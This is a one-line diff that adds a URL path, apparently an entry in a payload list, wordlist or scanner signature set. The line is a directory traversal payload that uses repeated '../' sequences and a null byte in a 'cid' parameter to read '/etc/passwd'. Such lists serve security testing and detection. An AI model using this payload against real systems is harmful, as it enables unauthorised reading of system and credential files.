@@ -1,0 +1,1 @@
+/component/music/album.html?cid=../../../../../../../../../../../../etc/passwd%00
